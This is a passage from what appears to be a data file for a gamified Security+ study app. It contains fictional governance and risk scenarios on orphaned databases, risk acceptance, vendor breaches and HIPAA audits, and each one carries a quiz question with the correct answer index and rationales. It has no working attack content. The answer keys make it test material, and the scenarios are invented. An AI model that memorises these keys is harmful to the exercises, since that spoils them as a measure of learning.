  - Playbooks: Step-by-step procedures, can be manual or automated (SOAR)
  - Security policies must be regularly reviewed and enforced
  - Change control must include security representation to catch dependencies
  - Testing disaster recovery plans is mandatory — untested plans always fail

The policy existed. The failure was governance — no enforcement, no cross-functional oversight, no consequences for skipping required steps.`,

    escalation: `The company took 5 days to restore operations using ad-hoc AWS recovery procedures. During the outage, sales halted, customer support couldn't access records, and payroll was delayed. Financial impact: $1.8M in lost revenue and emergency consulting fees. Three major clients terminated contracts due to the extended outage. The board fired the CIO and mandated quarterly disaster recovery tests, security representation on all change boards, and an annual third-party audit of governance compliance.`,

    refs: [
      { source: 'Study Guide', section: '5.1 - Security Policies', page: 89 },
      { source: 'Study Guide', section: '5.1 - Business Continuity Planning', page: 91 },
      { source: 'Study Guide', section: '5.1 - Change Management', page: 93 }
    ]
  },

  // ============================================================
  // DOMAIN 5 — Governance, Risk, Compliance (Obj 5.1/5.2)
  // Teaches: Data Roles, Risk Assessment Types, Qualitative/Quantitative Risk Analysis
  // ============================================================
  {
    id: 'MISSION-035',
    title: 'The Orphaned Database',
    domain: 'Governance, Risk, Compliance',
    objectiveCodes: ['5.1', '5.2'],
    threatLevel: 'high',
    tags: ['Data Governance', 'Risk Assessment', 'Data Roles', 'ALE', 'Risk Register'],
    briefing: `BREACH INVESTIGATION: A misconfigured database containing 50,000 customer records was discovered publicly accessible on the internet for 7 months. The security team found it during a routine vulnerability scan. When you ask who owns this database, the answer is shocking: nobody knows. The original project lead left the company 2 years ago, the database kept running, and no one took responsibility for securing it. Legal wants to know how sensitive data was left unmanaged, and Risk Management needs a full impact assessment before you notify affected customers.`,

    intel: [
      {
        id: 'orphan-01',
        type: 'forensic',
        label: 'Database Configuration Audit',
        content: `EXPOSED DATABASE: customer_analytics_db

Configuration Analysis:
  - Cloud Instance: AWS RDS (PostgreSQL)
  - Security Group: 0.0.0.0/0 allowed on port 5432 (wide open to the internet)
  - Created: March 2023 by jmiller@company.com (account disabled Nov 2023)
  - Data Classification: NONE (no tags or labels)
  - Backup Policy: Automated (good)
  - Encryption at Rest: Enabled (good)
  - Encryption in Transit: DISABLED (bad — credentials sent in plaintext)

Data Contents:
  - 50,847 customer records
  - Names, email addresses, phone numbers
  - Purchase history, payment card last-4-digits
  - No SSNs or full card numbers (lower severity than worst case)

The core problem: No one was assigned as the DATA OWNER. After jmiller left, the database became an orphaned asset. No one reviewed its security, no one validated the continued business need, and no one noticed the public exposure.`,
        critical: true
      },
      {
        id: 'orphan-02',
        type: 'report',
        label: 'Data Roles & Responsibilities',
        content: `GOVERNANCE FRAMEWORK — Data Roles (CompTIA Objective 5.1):

1. Data Owner
   - Senior executive (VP, Director level) responsible for the data
   - Defines classification level (Public, Internal, Confidential, Restricted)
   - Approves access requests
   - Accountable for security and compliance
   - This role WAS NEVER ASSIGNED for customer_analytics_db

2. Data Steward / Data Custodian
   - Implements controls defined by the data owner
   - Day-to-day management (backups, patches, access provisioning)
   - Typically IT or database administrators
   - jmiller acted as steward until departure — no replacement assigned

3. Data Controller (GDPR term)
   - Entity that determines purposes and means of processing personal data
   - Makes decisions about what data to collect and why
   - Legal accountability for processing

4. Data Processor (GDPR term)
   - Entity that processes data on behalf of the controller
   - Example: Third-party cloud provider, payroll vendor
   - Must follow controller's instructions

Without a defined data owner, there's no accountability. When jmiller left, ownership should have transferred to a manager in Marketing (the department using the analytics data). Instead, the database became no one's problem until it became everyone's crisis.`,
        critical: true
      },
      {
        id: 'orphan-03',
        type: 'log',
        label: 'Risk Assessment History',
        content: `RISK MANAGEMENT REVIEW:

The company conducts risk assessments, but the type and frequency matter:

- One-time assessment: Conducted once (e.g., before launching a new product)
- Recurring assessment: Scheduled regular intervals (quarterly, annually)
- Continuous assessment: Ongoing monitoring with automated tools
- Ad hoc assessment: Triggered by specific events (breach, audit finding, new threat)

The last enterprise-wide risk assessment was 18 months ago (RECURRING, annual). It identified "Cloud Misconfigurations" as a risk but did not inventory every cloud resource. The assessment was too high-level to catch this specific database.

Continuous monitoring would have detected the public exposure through automated configuration scanning (AWS Config, Security Hub, or third-party CSPM tools). The company lacked continuous risk assessment for cloud infrastructure.

Result: A RECURRING annual assessment missed a critical vulnerability that existed for 7 months. CONTINUOUS monitoring would have caught it in days.`,
        critical: false
      },
      {
        id: 'orphan-04',
        type: 'report',
        label: 'Quantitative Risk Analysis',
        content: `RISK CALCULATION (Quantitative Risk Assessment):

Scenario: Publicly exposed customer database (pre-incident calculation)

1. Asset Value (AV): $500,000
   - Regulatory fines (GDPR/CCPA): estimated $200K
   - Incident response costs: $100K
   - Customer notification: $50K
   - Reputation damage / customer churn: $150K

2. Exposure Factor (EF): 60%
   - Not all customers will churn, not maximum fine
   - Partial impact estimate

3. Single Loss Expectancy (SLE) = AV × EF
   - SLE = $500,000 × 0.60 = $300,000 per incident

4. Annual Rate of Occurrence (ARO): 0.75
   - Based on industry data: publicly exposed databases discovered/exploited within 1 year ~75% probability

5. Annualized Loss Expectancy (ALE) = SLE × ARO
   - ALE = $300,000 × 0.75 = $225,000/year

This quantitative calculation (using dollar values) helps executives understand financial risk. Compare this to QUALITATIVE risk assessment, which uses categories like "High/Medium/Low" or a traffic light grid (Red/Yellow/Green). Quantitative is more precise but requires good data; qualitative is faster but less exact.

The breach actually happened, so the SLE prediction was accurate. The company is now facing the $300K impact.`,
        critical: false
      },
      {
        id: 'orphan-05',
        type: 'alert',
        label: 'Risk Register Entry',
        content: `RISK REGISTER UPDATE:

Risk ID: RISK-2025-033
Risk Title: Orphaned cloud databases without assigned data owners
Identified: February 2025 (this incident)
Category: Data Governance / Access Control

Risk Rating (Qualitative):
  - Likelihood: HIGH (happened once, likely exists elsewhere)
  - Impact: HIGH (regulatory fines, reputation damage)
  - Overall Risk: CRITICAL (red on traffic light grid)

Current Controls: None effective
Residual Risk: CRITICAL

Key Risk Indicator (KRI): Number of cloud resources without assigned ownership tags
Current KRI Value: 47 untagged databases found in audit

A risk register is the centralized log of all identified risks, their ratings, controls, and owners. Every identified risk should have:
  - Risk owner (accountable executive)
  - Mitigation plan or acceptance decision
  - Monitoring metric (KRI)

This risk was never in the register before the breach. It should have been identified during cloud security assessments.`,
        critical: false
      }
    ],

    challenge: {
      question: 'Which data role was MOST critically missing, directly causing the database to remain unsecured after jmiller departed?',
      options: [
        'Data Processor — a third party to manage the database operations',
        'Data Custodian — an IT admin to perform daily backups',
        'Data Owner — an accountable executive to oversee security and compliance',
        'Data Controller — a legal entity to define processing purposes'
      ],
      correctIndex: 2,
      rationales: [
        'INCORRECT: A data processor is a third party (vendor) that processes data on your behalf. The database was already managed internally — the problem was not vendor management but lack of internal accountability.',
        'INCORRECT: Data custodians (stewards) handle day-to-day operations. Backups were automated and working. The problem was not operational execution but lack of oversight and security decision-making authority.',
        'CORRECT: A data owner is the senior executive accountable for the data\'s classification, security, and compliance. When jmiller left, no one at the executive level took ownership. Without an owner, there was no one to authorize security changes, review configurations, or validate the data\'s continued business need. This is the root cause.',
        'INCORRECT: Data controller is a GDPR legal concept defining who makes processing decisions. The company was the controller by default. The problem was internal role assignment, not legal entity definition.'
      ]
    },

    debrief: `This investigation covers CompTIA Objectives 5.1 and 5.2: Data Roles and Risk Management.

Key concepts learned:
  - Data Owner: Accountable executive who defines classification and approves access
  - Data Steward/Custodian: IT role handling daily management and technical controls
  - Data Controller: Legal entity determining data processing purposes (GDPR)
  - Data Processor: Third party processing data on your behalf (GDPR)
  - Risk Assessment Types: One-time, recurring, continuous, ad hoc
  - Qualitative Risk: Uses categories (High/Medium/Low, traffic light grids)
  - Quantitative Risk: Uses financial calculations (ALE = SLE × ARO)
  - Risk Register: Centralized log of all identified risks and mitigation plans
  - Key Risk Indicators (KRI): Metrics for monitoring risk levels over time

Every data asset must have an assigned owner. When employees leave, ownership transfers — it doesn't disappear. Continuous risk monitoring catches misconfigurations faster than annual assessments.`,

    escalation: `The breach notification goes to 50,847 customers across three states. California's CCPA and the EU's GDPR trigger regulatory investigations. Total fines: $340,000. Customer churn: 8% of the affected base cancels service, costing $290,000 in annual recurring revenue. The Board mandates immediate remediation: all cloud resources must be tagged with a data owner within 60 days, continuous configuration monitoring deployed within 90 days, and quarterly access reviews for all databases containing customer data.`,

    refs: [
      { source: 'Study Guide', section: '5.1 - Data Roles and Responsibilities', page: 87 },
      { source: 'Study Guide', section: '5.2 - Risk Assessment', page: 95 },
      { source: 'Study Guide', section: '5.2 - Quantitative Risk Analysis', page: 97 }
    ]
  },

  // ============================================================
  // DOMAIN 5 — Governance, Risk, Compliance (Obj 5.2)
  // Teaches: RTO/RPO/MTTR/MTBF, Risk Strategies, BIA, Impact Categories
  // ============================================================
  {
    id: 'MISSION-036',
    title: 'The Calculated Gamble',
    domain: 'Governance, Risk, Compliance',
    objectiveCodes: ['5.2'],
    threatLevel: 'critical',
    tags: ['Risk Management', 'BIA', 'RTO', 'RPO', 'Risk Strategies'],
    briefing: `EXECUTIVE BREACH POST-MORTEM: Six months ago, the Risk Committee identified a vulnerability in your legacy payment processing system. The remediation cost was estimated at $400,000. After reviewing a Business Impact Analysis, the CFO chose to "accept" the risk rather than fund the fix, citing budget constraints. Last night, that exact vulnerability was exploited. Attackers encrypted the payment system and demanded a $2M ransom. The CEO is furious: "You told me we could accept this risk. Now we've lost everything." You need to investigate what went wrong with the risk decision and the BIA that informed it.`,

    intel: [
      {
        id: 'gamble-01',
        type: 'report',
        label: 'Original Risk Assessment (6 months ago)',
        content: `RISK COMMITTEE MEETING MINUTES — August 2024

RISK ID: RISK-2024-089
Description: Legacy payment system (PAY-SRV-01) vulnerable to ransomware (no EDR, outdated OS, exposed to internal network)

Risk Management Strategies (four options presented):

1. MITIGATE — Reduce the risk
   - Deploy endpoint detection & response (EDR)
   - Upgrade OS and patch vulnerabilities
   - Segment payment system onto isolated VLAN
   - Cost: $400,000 (implementation + ongoing licensing)
   - Residual risk: LOW

2. TRANSFER — Shift the risk to another party
   - Purchase cyber insurance policy covering ransomware
   - Cost: $80,000/year premium
   - Coverage: Up to $5M (but ransom payments often excluded)
   - Note: Insurance doesn't prevent the attack, only helps pay for recovery

3. AVOID — Eliminate the risk entirely
   - Decommission legacy system, migrate to SaaS payment provider
   - Cost: $850,000 (migration project)
   - Timeline: 9 months
   - Residual risk: NONE (system no longer exists)

4. ACCEPT — Acknowledge the risk and take no action
   - Cost: $0 upfront
   - Requirement: Must be formally documented with executive sign-off
   - Suitable only when: Impact is within risk tolerance

CFO Decision: ACCEPT the risk.
Rationale: "Payment system has run for 8 years without incident. Budget does not allow $400K expenditure this fiscal year."`,
        critical: true
      },
      {
        id: 'gamble-02',
        type: 'forensic',
        label: 'Business Impact Analysis Review',
        content: `BUSINESS IMPACT ANALYSIS (BIA) — Payment Processing System (conducted 6 months ago)

The BIA was supposed to quantify what happens if this system fails.

Recovery Metrics Defined:
  - RTO (Recovery Time Objective): 8 hours
    → Maximum acceptable downtime before business impact becomes critical
  - RPO (Recovery Point Objective): 1 hour
    → Maximum acceptable data loss (how old can restored backups be)
  - MTBF (Mean Time Between Failures): 720 hours (30 days)
    → Average time the system runs before failure (historical average)
  - MTTR (Mean Time to Repair): 4 hours
    → Average time to restore service after failure (historical average)

Impact Categories Assessed:
  ✓ Financial: $50K/day revenue loss during downtime (UNDERESTIMATED)
  ✗ Life: Not assessed (payment system is not life-critical)
  ✗ Safety: Not assessed
  ✗ Property: Not assessed
  ✓ Reputation: "Moderate damage" (UNDERESTIMATED)

CRITICAL ERROR: The BIA calculated impact for a normal outage (hardware failure, power loss) but did NOT assess impact of a MALICIOUS attack scenario (ransomware, data destruction). The $50K/day estimate assumed a 4-hour MTTR. A ransomware attack has a MUCH longer recovery time — days or weeks — and destroys backups.

The risk acceptance decision was based on incomplete data. The CFO thought the worst case was losing $50K. The actual worst case was losing millions.`,
        critical: true
      },
      {
        id: 'gamble-03',
        type: 'log',
        label: 'Incident Response Timeline',
        content: `RANSOMWARE ATTACK — February 6, 2025

23:15 — Attacker gains access via phishing email (employee clicked malicious link)
23:22 — Lateral movement to payment server (no network segmentation)
23:45 — Ransomware deployed, encryption begins
00:10 — Payment system offline, ransom note displayed
00:30 — IT team alerted, begins investigation
02:00 — Backup server also encrypted (ransomware targeted backup repository)
08:00 — Executive team briefed: ALL backups compromised, no recovery path
12:00 — Forensics confirms: RPO violated (cannot restore to recent state)
16:00 — Business halted: cannot process payments, accept orders, or issue refunds
Day 3 — Customer complaints flood social media, reputation damage escalates
Day 5 — CFO authorizes ransom payment: $2M in Bitcoin
Day 7 — Decryption key received, recovery begins
Day 10 — Systems restored, but 7 days of transactions lost

Actual Metrics Experienced:
  - RTO VIOLATED: 10 days downtime (objective was 8 hours)
  - RPO VIOLATED: 7 days of data lost (objective was 1 hour)
  - MTTR: 240 hours (objective was 4 hours)

The BIA's recovery metrics were based on normal failures. This malicious attack scenario was never modeled.`,
        critical: false
      },
      {
        id: 'gamble-04',
        type: 'witness',
        label: 'CFO Interview',
        content: `"When Risk presented the options, they told me the payment system had a mean time between failures of 30 days and we could recover in 4 hours. I did the math: $50K per day times maybe 1 day of downtime once a month is manageable. The $400K mitigation cost didn't justify that level of risk.

No one told me the BIA didn't account for ransomware. I thought 'failure' meant everything — hardware, software, attacks, all of it. If they had said, 'A targeted attack could take us down for 10 days and cost $2 million,' I would never have accepted that risk. Our risk appetite for a single incident is capped at $500K. This was 4X our tolerance.

I signed a risk acceptance form, but it was based on faulty analysis. The BIA gave me a false sense of security. I thought I was making an informed decision. Instead, I gambled the company's solvency on incomplete data."`,
        critical: false
      },
      {
        id: 'gamble-05',
        type: 'alert',
        label: 'Financial Impact Summary',
        content: `TOTAL COST OF ACCEPTED RISK:

Direct Costs:
  - Ransom payment: $2,000,000
  - Incident response (forensics, consultants): $180,000
  - Legal fees and regulatory response: $120,000
  - Customer notification: $40,000

Indirect Costs:
  - Lost revenue (10 days no payments): $500,000
  - Customer churn (reputation damage): $750,000 estimated annual loss
  - Regulatory fine (data protection violation): $220,000
  - Emergency mitigation deployment (post-breach): $400,000

TOTAL: $4,210,000

Original mitigation cost (if accepted 6 months ago): $400,000

Cost of "accepting" the risk: 10.5X the cost of mitigating it.

Lesson: Risk acceptance is only appropriate when:
  1. The impact is WITHIN your risk appetite/tolerance
  2. The BIA accurately models ALL failure scenarios (including malicious attacks)
  3. Executive decision-makers understand the true worst case
  4. Risks are continuously monitored and re-evaluated

A risk exemption or exception may be granted temporarily, but it should include compensating controls and a mandatory review date. This risk was accepted with no conditions and no review — a governance failure.`,
        critical: false
      }
    ],

    challenge: {
      question: 'What was the PRIMARY failure that led to the disastrous risk acceptance decision?',
      options: [
        'The CFO lacked technical expertise to understand ransomware threats',
        'The company should have chosen risk transfer (insurance) instead of acceptance',
        'The Business Impact Analysis failed to model malicious attack scenarios',
        'The MTBF calculation was inaccurate due to insufficient historical data'
      ],
      correctIndex: 2,
      rationales: [
        'INCORRECT: While technical understanding helps, the CFO relied on the BIA — which is supposed to translate technical risks into business terms. The failure was not the CFO\'s expertise but the incomplete BIA provided to inform the decision.',
        'INCORRECT: Risk transfer via insurance would have helped offset costs but not prevented the attack. Insurance often excludes ransom payments, and the breach still would have caused massive operational disruption. The root cause was not the choice of strategy but the flawed impact assessment informing it.',
        'CORRECT: The BIA calculated impact for normal operational failures (hardware, power) but ignored malicious attack scenarios like ransomware. It underestimated both financial impact and recovery time, giving executives a false understanding of the risk. The CFO thought the worst case was $50K/day for a few hours. The actual worst case was $4M+ and 10 days. Risk decisions are only as good as the impact analysis behind them.',
        'INCORRECT: MTBF measures reliability under normal conditions. The issue was not measurement accuracy but scenario coverage — the BIA modeled routine failures, not cyberattacks.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 5.2: Risk Management and Business Impact Analysis.

Key concepts learned:
  - RTO (Recovery Time Objective): Max acceptable downtime
  - RPO (Recovery Point Objective): Max acceptable data loss
  - MTTR (Mean Time to Repair): Average time to restore service
  - MTBF (Mean Time Between Failures): Average time between failures
  - Risk Management Strategies: MITIGATE (reduce), TRANSFER (insure), AVOID (eliminate), ACCEPT (do nothing)
  - Risk Acceptance: Only valid when impact is within risk appetite/tolerance
  - BIA (Business Impact Analysis): Must model ALL failure scenarios, including malicious attacks
  - Impact Categories: Life, property, safety, finance, reputation
  - Risk Appetite vs Risk Tolerance: Appetite is willingness to take risk; tolerance is maximum acceptable threshold

A BIA that only considers operational failures without modeling security incidents is incomplete and dangerous. Risk acceptance based on flawed analysis is not informed decision-making — it's gambling.`,

    escalation: `The $4.2M loss exceeds the company's cyber insurance deductible and annual profit margin. The Board launches an investigation into the CFO's decision. The CFO resigns. Shareholders file a lawsuit alleging negligent risk management. The company's credit rating is downgraded. New risk governance policies are mandated: all risk acceptance decisions above $100K require Board approval, BIAs must include attack scenarios validated by security leadership, and risk appetite thresholds must be formally documented and reviewed quarterly.`,

    refs: [
      { source: 'Study Guide', section: '5.2 - Business Impact Analysis', page: 99 },
      { source: 'Study Guide', section: '5.2 - Risk Management Strategies', page: 96 },
      { source: 'Study Guide', section: '5.2 - Recovery Metrics', page: 100 }
    ]
  },

  // ============================================================
  // DOMAIN 5 — Governance, Risk, Compliance (Obj 5.3)
  // Teaches: Third-party Risk, Vendor Due Diligence, Supply Chain, Agreements (SLA/MOU/MOA/MSA/SOW/NDA/BPA)
  // ============================================================
  {
    id: 'MISSION-037',
    title: 'The Trusted Partner',
    domain: 'Governance, Risk, Compliance',
    objectiveCodes: ['5.3'],
    threatLevel: 'critical',
    tags: ['Third-party Risk', 'Supply Chain', 'Vendor Management', 'SLA', 'Due Diligence'],
    briefing: `SUPPLY CHAIN BREACH: Your managed IT service provider, TechFlow Solutions, just disclosed a breach — attackers compromised their remote management tools and accessed systems for 50 of their clients, including your company. Forensics confirms the attackers had administrative access to your network for 3 weeks. Your legal team pulls the contract: the SLA promises "industry-standard security," but there's no right-to-audit clause, no security questionnaire was ever completed, and no one validated their security posture before signing the $2M/year contract. The board wants to know how a third-party vendor was trusted with full network access without proper due diligence.`,

    intel: [
      {
        id: 'vendor-01',
        type: 'alert',
        label: 'TechFlow Breach Notification',
        content: `SECURITY INCIDENT DISCLOSURE — TechFlow Solutions

Date: February 5, 2025
Affected Clients: 50 organizations
Attack Vector: Compromised remote management platform (SolarWinds-style supply chain attack)

Timeline:
  - January 10: Attackers gained access to TechFlow's RMM (Remote Monitoring and Management) tool
  - January 10-31: Lateral movement across client environments
  - February 3: Breach discovered by third-party SOC audit
  - February 5: Client notification sent

Your organization's exposure:
  - TechFlow had Domain Admin credentials to your network
  - RMM agent installed on 247 workstations and 18 servers
  - Attackers could execute commands, exfiltrate data, deploy malware
  - Full access for 3 weeks before detection

This is a SUPPLY CHAIN ATTACK — the vendor's security failure directly compromised your security. The attacker targeted TechFlow specifically to gain access to their clients. This mirrors the SolarWinds attack (2020), where compromised software updates gave attackers access to thousands of downstream organizations.

When you trust a vendor with privileged access, their security becomes YOUR security. Third-party risk assessment is mandatory.`,
        critical: true
      },
      {
        id: 'vendor-02',
        type: 'forensic',
        label: 'Contract and Agreement Review',
        content: `SERVICE AGREEMENT ANALYSIS — TechFlow Solutions

Master Service Agreement (MSA):
  - Signed: March 2023
  - Term: 3 years
  - Scope: Managed IT services, helpdesk, network monitoring, patch management

Service Level Agreement (SLA):
  - Uptime guarantee: 99.5%
  - Response time: 4 hours for critical issues
  - Security commitment: "TechFlow will maintain industry-standard security practices"
  - Penalty clause: Credits for SLA violations (uptime/response time only)

CRITICAL GAPS FOUND:

1. No Right-to-Audit Clause
   - You cannot inspect TechFlow's security controls
   - Cannot verify compliance with their "industry-standard" promise
   - No ability to validate their security posture

2. No Security Questionnaire Completed
   - No due diligence on encryption, access controls, incident response
   - No validation of SOC 2, ISO 27001, or other certifications
   - Vendor selection was based on cost and features, not security

3. No Independent Assessment Required
   - No mandate for third-party security audits
   - No penetration testing requirements
   - No proof of vulnerability management program

Other Agreement Types (for reference):
  - MOU (Memorandum of Understanding): Informal agreement, not legally binding
  - MOA (Memorandum of Agreement): Formal, legally binding version of MOU
  - SOW (Statement of Work): Defines specific project deliverables and timeline
  - NDA (Non-Disclosure Agreement): Protects confidential information sharing
  - BPA (Business Partnership Agreement): Defines partnership structure and responsibilities

Your MSA covered business terms but completely ignored security governance.`,
        critical: true
      },
      {
        id: 'vendor-03',
        type: 'report',
        label: 'Third-party Risk Assessment Framework',
        content: `VENDOR SECURITY DUE DILIGENCE — What Should Have Happened:

1. Vendor Selection Phase:
   ✗ Security questionnaire (not completed)
     - Encryption standards, access controls, logging
     - Incident response capabilities
     - Business continuity / disaster recovery plans
   ✗ Conflict of interest check (not performed)
     - Ensure vendor doesn't have competing clients or conflicts
   ✗ Financial stability review (not performed)
     - Ensure vendor can sustain security investments

2. Contracting Phase:
   ✗ Right-to-audit clause (missing from contract)
     - Allows you to inspect vendor's security controls
     - Can request evidence of compliance
   ✗ Security SLA metrics (missing)
     - Patch deployment timelines
     - Vulnerability remediation windows
     - Incident notification requirements
   ✗ Independent assessment requirement (missing)
     - SOC 2 Type II report (proves controls are effective over time)
     - ISO 27001 certification
     - Annual penetration testing

3. Ongoing Monitoring:
   ✗ Quarterly security reviews (not conducted)
   ✗ Annual re-assessment (not scheduled)
   ✗ Access review (TechFlow had standing Domain Admin — should be just-in-time)

RESULT: TechFlow was granted privileged access with ZERO security validation. This is the opposite of vendor due diligence.`,
        critical: false
      },
      {
        id: 'vendor-04',
        type: 'witness',
        label: 'Procurement Interview',
        content: `Interview with Director of Procurement:

"We selected TechFlow based on a competitive bidding process. They were 20% cheaper than the other finalist. The IT team said they needed managed services, so we negotiated the best price and signed.

Security team was not involved in the vendor selection. We assumed TechFlow was reputable — they had big-name clients and good references. No one asked for a SOC 2 report or security certifications. That wasn't in the RFP (Request for Proposal).

Legal reviewed the contract for liability and terms, but they don't evaluate technical security. We have a vendor risk management policy that requires security assessment for 'high-risk vendors,' but TechFlow wasn't classified as high-risk because they weren't handling payment data or PHI. We didn't realize that giving them Domain Admin access made them the HIGHEST risk vendor we have.

In hindsight, we should have required them to complete a security questionnaire and provide proof of an independent security audit before even considering them."`,
        critical: false
      },
      {
        id: 'vendor-05',
        type: 'log',
        label: 'Vendor Monitoring Audit',
        content: `VENDOR ACCESS REVIEW (post-breach audit):

TechFlow Solutions:
  - Active Directory: Domain Admins group (247 objects manageable)
  - RMM Agent: Installed on 265 endpoints (SYSTEM-level privileges)
  - VPN Access: 24/7 unrestricted (no time-based restrictions)
  - MFA: NOT REQUIRED for TechFlow technician accounts
  - Access Reviews: NEVER CONDUCTED (access granted in 2023, never revalidated)

When TechFlow was breached, the attackers inherited all of these privileges across 50 client organizations.

Vendor monitoring best practices (that were not followed):
  - Least-privilege access: TechFlow should have role-based access, not Domain Admin
  - Just-in-time access: Grant admin rights only when needed, revoke after task completion
  - Conditional access: Require MFA, restrict by IP/location
  - Quarterly access reviews: Validate that vendor still needs the access level granted
  - Vendor risk scoring: Continuously monitor vendor security posture (threat intel, breach news)

The company treated TechFlow as a trusted partner but applied zero verification. "Trust but verify" is the principle — you must continuously validate that trust is warranted.`,
        critical: false
      }
    ],

    challenge: {
      question: 'Which third-party risk control would have been MOST effective at preventing or detecting this breach impact?',
      options: [
        'A Business Partnership Agreement (BPA) defining revenue-sharing terms',
        'A right-to-audit clause enabling inspection of TechFlow\'s security controls',
        'A Non-Disclosure Agreement (NDA) protecting confidential information',
        'A Memorandum of Understanding (MOU) outlining partnership goals'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: A BPA governs business partnership structures and revenue sharing. It does not address security controls, vendor risk assessment, or the ability to verify security practices.',
        'CORRECT: A right-to-audit clause would have allowed you to inspect TechFlow\'s security controls before and during the contract. You could have requested their SOC 2 report, validated their RMM tool security, and identified gaps (no MFA, weak access controls). This visibility is the cornerstone of third-party risk management — you cannot manage risk in vendors you cannot inspect.',
        'INCORRECT: An NDA protects against unauthorized disclosure of confidential information. While important, it does not prevent security breaches or provide visibility into vendor security posture. The breach did not result from TechFlow intentionally disclosing your data — it resulted from their inadequate security.',
        'INCORRECT: An MOU is typically informal and outlines general partnership intentions. It does not include enforceable security requirements or audit rights.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 5.3: Third-party Risk Management.

Key concepts learned:
  - Supply Chain Risk: Vendor compromises can cascade to all their clients (SolarWinds example)
  - Vendor Due Diligence: Security questionnaires, financial review, conflict of interest checks
  - Right-to-Audit: Contractual ability to inspect vendor security controls
  - Independent Assessments: SOC 2 Type II, ISO 27001, penetration tests prove security
  - Vendor Monitoring: Quarterly reviews, access validation, continuous risk scoring
  - Agreement Types:
    - SLA (Service Level Agreement): Performance and uptime commitments
    - MSA (Master Service Agreement): Overarching terms for ongoing relationship
    - SOW (Statement of Work): Project-specific deliverables
    - MOU/MOA (Memorandum of Understanding/Agreement): Partnership terms
    - NDA (Non-Disclosure Agreement): Confidentiality protection
    - BPA (Business Partnership Agreement): Business structure and revenue terms

When vendors have privileged access, their security failures become your breaches. Due diligence and ongoing monitoring are mandatory.`,

    escalation: `The breach exposed customer PII for 15,000 users. Regulatory fines total $890,000. TechFlow's insurance covers only $200K of your losses, and legal battles over liability will take years. Your company terminates the TechFlow contract and faces a $400K early termination penalty (ironically, the contract had strong penalties for YOU leaving but none for THEIR security failures). The board mandates a complete vendor risk program overhaul: all vendors with privileged access must complete annual SOC 2 audits, contracts must include right-to-audit clauses and security SLAs, and a new vendor risk committee will review all third-party engagements before contract signing.`,

    refs: [
      { source: 'Study Guide', section: '5.3 - Third-party Risk Assessment', page: 102 },
      { source: 'Study Guide', section: '5.3 - Vendor Due Diligence', page: 103 },
      { source: 'Study Guide', section: '5.3 - Agreement Types', page: 105 }
    ]
  },

  // ============================================================
  // DOMAIN 5 — Governance, Risk, Compliance (Obj 5.4/5.5)
  // Teaches: Compliance (SOX, HIPAA, GLBA), Privacy (GDPR), Audits, Penetration Testing, Attestation
  // ============================================================
  {
    id: 'MISSION-038',
    title: 'The Compliance Reckoning',
    domain: 'Governance, Risk, Compliance',
    objectiveCodes: ['5.4', '5.5'],
    threatLevel: 'critical',
    tags: ['Compliance', 'HIPAA', 'Privacy', 'GDPR', 'Audits', 'Regulations'],
    briefing: `REGULATORY AUDIT CRISIS: The Department of Health and Human Services just completed a surprise HIPAA compliance audit of your healthcare organization. The findings are devastating: encryption disabled on patient databases, access logs not monitored, no risk analysis performed in 3 years, and former employees still have active accounts in the EHR system. The auditor's preliminary assessment estimates $5.2M in potential fines across 47 violations. Your General Counsel needs a full impact analysis, and the compliance officer who was supposed to be managing this resigned yesterday. You have 30 days to respond before HHS issues final penalties.`,

    intel: [
      {
        id: 'comply-01',
        type: 'report',
        label: 'HIPAA Audit Findings Report',
        content: `OFFICE OF CIVIL RIGHTS (OCR) — HIPAA COMPLIANCE AUDIT

Regulation: Health Insurance Portability and Accountability Act (HIPAA)
Scope: Protection of Protected Health Information (PHI)
Entity Type: Covered Entity (healthcare provider)

VIOLATIONS IDENTIFIED:

1. Administrative Safeguards (45 CFR § 164.308):
   ✗ No risk analysis conducted since 2022 (required annually)
   ✗ No risk management plan
   ✗ Workforce access not reviewed (former employees still active)
   ✗ No security awareness training (required annually)

2. Physical Safeguards (45 CFR § 164.310):
   ✗ Server room access not logged
   ✗ Workstations in public areas not configured with privacy screens

3. Technical Safeguards (45 CFR § 164.312):
   ✗ Encryption not implemented on patient database (CRITICAL)
   ✗ Access logs not reviewed (audit controls failure)
   ✗ No automatic logoff on workstations

HIPAA is one of several key compliance regulations:
  - HIPAA: Healthcare data (PHI — Protected Health Information)
  - SOX (Sarbanes-Oxley): Financial reporting for public companies
  - GLBA (Gramm-Leach-Bliley Act): Financial institution customer data
  - GDPR (General Data Protection Regulation): EU personal data

Each regulation has monitoring, due diligence, and due care requirements. "Due diligence" means identifying risks; "due care" means implementing controls to address them. This organization failed both.`,
        critical: true
      },
      {
        id: 'comply-02',
        type: 'forensic',
        label: 'Access Control Audit',
        content: `ELECTRONIC HEALTH RECORD (EHR) SYSTEM — Access Review

Active User Accounts: 487
Current Employees: 441
DISCREPANCY: 46 orphaned accounts (former employees, contractors)

Sample findings:
  - Dr. Rebecca Chen: Terminated 14 months ago, account still ACTIVE
  - Nurse Jamie Patel: Transferred to different facility 8 months ago, still has access
  - IT Contractor (external): Project ended 18 months ago, VPN access still enabled

HIPAA requires: "Implement procedures to terminate access when employment ends" (164.308(a)(3)(ii)(C))

Privacy Implications (GDPR principles also relevant):
  - Data Subject Rights: Patients have the right to know who accessed their records
  - Right to be Forgotten: In EU, individuals can request data deletion (GDPR Article 17)
  - Data Sovereignty: Data must be stored in jurisdictions with adequate protection

Access logs show 8 instances where terminated employees' credentials were used AFTER termination. Either the former employee accessed the system post-termination (unauthorized access), or someone else used their credentials (shared passwords — another violation).

Offboarding procedures must include immediate access revocation to all systems containing sensitive data. The failure to do this violates both HIPAA and basic security hygiene.`,
        critical: true
      },
      {
        id: 'comply-03',
        type: 'log',
        label: 'Attestation and Certification Review',
        content: `COMPLIANCE ATTESTATION HISTORY:

Annual HIPAA Security Risk Analysis:
  - 2021: COMPLETED (external consultant, 47 findings)
  - 2022: COMPLETED (internal IT team, 12 findings)
  - 2023: NOT PERFORMED
  - 2024: NOT PERFORMED
  - 2025: NOT PERFORMED (current year)

Attestation: The compliance officer signed annual attestation forms certifying HIPAA compliance for 2023 and 2024 despite no risk analysis being conducted. This is fraudulent attestation.

Attestation is a formal declaration that controls are in place and effective. It carries legal weight. False attestation can result in:
  - Personal liability for the signing officer
  - Increased penalties (willful neglect vs. reasonable cause)
  - Criminal charges in cases of fraud

The compliance officer likely resigned to avoid criminal liability when the audit was announced.

Compare to other compliance frameworks:
